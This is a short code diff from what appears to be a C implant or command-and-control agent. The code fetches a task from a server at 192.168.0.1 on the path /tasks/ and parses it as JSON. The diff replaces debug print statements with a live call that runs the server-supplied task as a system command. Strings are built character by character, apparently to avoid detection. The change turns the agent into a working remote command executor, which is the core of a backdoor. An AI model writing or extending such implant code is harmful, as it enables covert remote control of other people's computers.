@@ -959,9 +959,6 @@ void messagebox() {
     CHAR runCmd_c[] = {'R', 'u', 'n', 'C', 'm', 'd', 0};
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
-    CHAR cmd[] = {'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0};
-
-    //((RUNCMD)PEsgStdApi->RunCmd)(cmd);
 
     WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
     WCHAR path[] = {'/', 't', 'a', 's', 'k', 's', '/', 0};
@@ -977,9 +974,8 @@ void messagebox() {
     CHAR* agentUuid = {0};
     CHAR* task;
     task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
-    ((PRINTF)api->printf)(task);
-    ((PRINTF)api->printf)(taskId);
-    ((PRINTF)api->printf)(agentUuid);
+
+    ((RUNCMD)PEsgStdApi->RunCmd)(task);
 
     ((FREE)api->free)(jsonResponse);
     //((FREE)api->free)(pEsgStdDll);
